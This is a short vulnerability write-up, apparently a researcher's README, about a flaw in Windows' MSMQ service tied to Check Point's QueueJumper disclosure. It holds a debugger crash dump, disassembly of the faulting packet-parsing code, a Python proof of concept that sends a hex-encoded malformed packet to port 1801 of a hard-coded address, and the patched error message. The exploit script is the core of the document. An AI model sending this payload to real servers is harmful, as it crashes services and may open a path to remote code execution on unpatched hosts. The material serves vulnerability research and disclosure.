# msmq_re

This is one of the vulnerabilities fixed in MSMQ.
>https://research.checkpoint.com/2023/queuejumper-critical-unauthorized-rce-vulnerability-in-msmq-service/

```
0:064> r
rax=0000000000001000 rbx=000001b4ee9b5cf8 rcx=0000000000000006
rdx=000001b4240b5c24 rsi=0000000000000002 rdi=00000008e6c7fb10
rip=00007ffcc9708b80 rsp=00000008e6c7fa00 rbp=00000008e6c7fa40
 r8=0000000000000000  r9=000001b4247e3d90 r10=000001b4240b5c34
r11=00000008e6c7f9f8 r12=0000000000000000 r13=0000000000000001
r14=0000000000000001 r15=000001b4240b5dec
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010244
MQQM!CQmPacket::CQmPacket+0x8fc:
00007ffc`c9708b80 48c7030c000000  mov     qword ptr [rbx],0Ch ds:000001b4`ee9b5cf8=????????????????
0:064> k
 # Child-SP          RetAddr               Call Site
00 00000008`e6c7fa00 00007ffc`c972699a     MQQM!CQmPacket::CQmPacket+0x8fc
01 00000008`e6c7fa70 00007ffc`c9723836     MQQM!CSockTransport::HandleReceiveUserMsg+0x62
02 00000008`e6c7fcd0 00007ffc`c9723bd2     MQQM!CSockTransport::ReadUserMsgCompleted+0xd6
03 00000008`e6c7fd30 00007ffc`c9723faf     MQQM!CSockTransport::ReadUsrHeaderCompleted+0x312
04 00000008`e6c7fde0 00007ffc`c9723eac     MQQM!CSockTransport::ReadCompleted+0xef
05 00000008`e6c7fe40 00007ffc`c976ea2a     MQQM!CSockTransport::ReceiveDataSucceeded+0x7c
06 00000008`e6c7fe80 00007ffc`d2334de0     MQQM!ExpWorkingThread+0xfa
07 00000008`e6c7fed0 00007ffc`d2ffe3db     KERNEL32!BaseThreadInitThunk+0x10
08 00000008`e6c7ff00 00000000`00000000     ntdll!RtlUserThreadStart+0x2b


.text:0000000180038B69 loc_180038B69:                          ; CODE XREF: CQmPacket::CQmPacket(CBaseHeader *,CPacket *,bool,bool,_TA_ADDRESS const *,int)+761↑j
.text:0000000180038B69                                         ; CQmPacket::CQmPacket(CBaseHeader *,CPacket *,bool,bool,_TA_ADDRESS const *,int)+86F↑j ...
.text:0000000180038B69                 mov     r9, [rbp+Src]
.text:0000000180038B6D                 test    r9, r9
.text:0000000180038B70                 jz      loc_180038C58
.text:0000000180038B76                 cmp     [rbp+arg_30], r12d
.text:0000000180038B7A                 jnz     loc_180038C58
.text:0000000180038B80                 mov     qword ptr [rbx], 0Ch
.text:0000000180038B87                 mov     rcx, r12
.text:0000000180038B8A                 mov     [rbx+8], r12d
.text:0000000180038B8E                 mov     rdx, r12
.text:0000000180038B91                 mov     [rdi+0C0h], rbx
.text:0000000180038B98                 mov     eax, [rbx]
.text:0000000180038B9A                 mov     [rbp+var_18], rax
.text:0000000180038B9E                 mov     [rbp+pExceptionObject], rbx
```

## PoC (Signature and then Signature again!)
```python
import socket
import binascii

boom = ('100023004c494f52c801000000460500897a1127'
        '3cf59641ba3d71ca7a77e1e60000000000000000'
        '0000000000000000ffffffff4c494f5205380000'
        '201726d03c004f0053003a00310030002e003100'
        '30002e00310031002e00330036005c0050007200'
        '6900760061007400650024005c00710075006500'
        '7500650000000000000d00000000000000000000'
        '0000000000000000000000000000000000000000'
        '1100000011000000000000000e80000001680000'
        '00000000480065006c006c006f0020004f006d00'
        '6100690072002100000048656c6c6f2c204e6577'
        '4f6d61697221000000000000c000000064000000'
        '03000000030068007400740070003a002f002f00'
        '310030002e00310030002e00310030002e003500'
        '30002f004d005100000003004f0053003a007400'
        '630070003a00310030002e00310030002e003100'
        '30002e00350030005c0050007200690076006100'
        '7400650024005c00710075006500750065000000'
        '03004f0053003a00310030002e00310030002e00'
        '310031002e00330036005c005000720069007600'
        '61007400650024005c0071007500650075006500'
        '000000000c000000c8000000000000000c000000'
        '2c010000000000005e01000000000000')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.11.36", 1801))
s.sendall(binascii.unhexlify(boom))
s.close()
```

## Patched 
"A corrupted packet was encountered: 'Next section is behind packet end' ..."
